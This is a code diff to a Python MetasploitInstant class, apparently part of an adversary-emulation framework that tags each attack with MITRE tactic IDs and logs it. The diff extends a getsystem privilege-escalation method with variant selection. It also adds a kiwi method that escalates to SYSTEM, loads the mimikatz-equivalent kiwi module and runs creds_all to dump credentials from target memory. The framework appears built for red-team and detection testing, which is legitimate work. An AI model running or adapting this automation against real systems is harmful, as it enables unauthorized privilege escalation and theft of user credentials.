@@ -471,7 +471,7 @@ class MetasploitInstant(Metasploit):
                                                            tactics=tactics,
                                                            tactics_id=tactics_id,
                                                            ttp=ttp)
-        res = self.meterpreter_execute_on([command], target)
+        res = self.meterpreter_execute_on([command], target, delay=5)
         print(f"Result of migrate {res}")
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
@@ -553,19 +553,27 @@ class MetasploitInstant(Metasploit):
                                                   result=res)
         return res
 
-    def getsystem(self, target, **kwargs):
-        """ Do a network discovery on the target """
+    def getsystem(self, target, variant=0, **kwargs):
+        """ Do a network discovery on the target
+
+        @param target: Target to attack
+        @param variant: Variant of getsystem to use. 0 is auto, max is 3
+        """
 
         command = "getsystem"
         ttp = "????"   # It uses one out of three different ways to elevate privileges.
         tactics = "Privilege Escalation"
         tactics_id = "TA0004"
         description = """
-Elevate privileges from local administrator to SYSTEM. Three ways to do that will be tried:
-* named pipe impersonation using cmd
-* named pipe impersonation using a dll
-* token duplication
+Elevate privileges from local administrator to SYSTEM. Three ways to do that will be tried:\n
+0) auto \n
+1) named pipe impersonation using cmd \n
+2) named pipe impersonation using a dll \n
+3) token duplication\n
 """
+
+        if variant != 0:
+            command += f" -t {variant}"
         # https://docs.rapid7.com/metasploit/meterpreter-getsystem/
 
         self.attack_logger.vprint(
@@ -761,4 +769,60 @@ Uploading new files to the target. Can be config files, tools, implants, ...
                                                   ttp=ttp,
                                                   logid=logid,
                                                   result=res)
+        return res
+
+    def kiwi(self, target, variant="creds_all", **kwargs):
+        """ Kiwi is the modern equivalent to mimikatz
+
+        @param target: target being attacked
+        @param variant: kiwi command being used
+        """
+
+        ttp = "t1003"
+        tactics = "Credential access"
+        tactics_id = "TA0006"
+        description = """
+Accessing user credentials in memory
+"""
+
+        res = []
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Preparing for Kiwi{CommandlineColors.ENDC}", 1)
+
+        # We need system privileges
+        self.getsystem(target, 0, **kwargs)
+
+        # Kiwi needs to be loaded
+        command = "load kiwi "
+        res += self.meterpreter_execute_on([command], target, kwargs.get("delay", 10))
+
+        # Executing kiwi
+        command = f"{variant} "
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="kiwi",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description",
+                                                                                            None),
+                                                           countermeasure=kwargs.get("countermeasure", None)
+                                                           )
+        res += self.meterpreter_execute_on([command], target, kwargs.get("delay", 10))
+
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
+
+        print(res)
         return res
